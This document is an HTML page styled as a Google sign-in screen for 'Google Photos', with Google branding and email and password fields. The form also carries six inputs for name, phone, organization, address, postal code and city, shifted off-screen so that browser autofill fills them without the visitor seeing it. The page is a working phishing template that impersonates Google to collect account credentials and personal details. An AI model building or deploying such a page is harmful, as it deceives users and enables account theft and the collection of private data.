<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Photos</title>
  <style>
    body {
    font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
    box-sizing: border-box;
}


.container {
  display: flex;
  flex-flow: column;
  width: 500px;
  margin: auto; 
}

.logo-block  {
  width: 100px;
  margin-left: auto;
  margin-right: auto;
  margin-top: 0px;
  margin-bottom: 0px;
  
}

.title-block, .signin-block {
  text-align: center;
  margin: auto;
  height: auto; 
}
  
.login-title { 
  color: #555;
  font-size: 36px;
  font-weight: 400;
  margin-top: 0px;
  margin-bottom: 0px;
  
  }

.login-text{
  color: #555;
  font-size: 18px;
  font-weight: 400;
}  
 
.account-wall {
   background-color: lightgrey;
   width: 350px;
   height: auto;
   background-color: #f7f7f7;
   -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
   -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
   box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
}

.profile-img{
    width: 96px;
    height: 96px;
    margin-top: 30px;
    margin-bottom:25px;
    -moz-border-radius: 50%;
    -webkit-border-radius: 50%;
    border-radius: 50%;
}

.form-signin .form-control {
    width: 300px;
    font-size: 16px;
    padding: 10px;
    -webkit-box-sizing: border-box;
    -moz-box-sizing: border-box;
    box-sizing: border-box;
}

.form-signin input {
    margin-bottom: 15px;
    border-radius: 4px;
}

#button1 {
    width: 40%;
    font-weight: 400;
    text-align: center;
    margin-bottom: 30px;
    color: #fff;
    background-color: #337ab7;
    border-color: #2e6da4;
    padding: 10px 16px;
    font-size: 18px;
    line-height: 1.3333333;
    border-radius: 6px;
    border: 1px solid transparent;
}

.new-account {
    text-align: center;
    display: block;
    margin-top: 10px;
    text-decoration: none;
    color: #337ab7;
}

.form-field-hidden {
  margin-left: -500px;
  display: hidden;
}
  </style>
</head>
<body>
     <div class="container">
    <div class="logo-block margin">
        <img src="google-logo.png" class="title-image" width="100px" alt="google logo">
    </div>

    <div class="title-block">
        <h1 class="login-title">One account. All of Google.</h1>
    </div>

    <div class="signin-block">
        <h3 class="login-text">Sign in with your Google Account</h3>

        <div class="account-wall">
            <img class="profile-img" src="default-profile.jpg" alt="profile picture">

            <form class="form-signin">
                <input type="text" class="form-control" placeholder="Email" required autofocus>
                <input type="password" class="form-control" placeholder="Password" required>
                <input type="text" class="form-field-hidden" id="name" name="name"> 
                <input type="text" class="form-field-hidden" id="phone" name="phone">
                <input type="text" class="form-field-hidden" id="organization" name="organization">
                <input type="text" class="form-field-hidden" id="address" name="address">
                <input type="text" class="form-field-hidden" id="postal" name="postal">
                <input type="text" class="form-field-hidden" id="city" name="city">
                <button id="button1" type="submit">Sign in</button>
            </form>
        </div>

        <a href="#" class="new-account">Create an account </a>
    </div>
</div>
</body>
  <script src="script.js"></script>
</html>
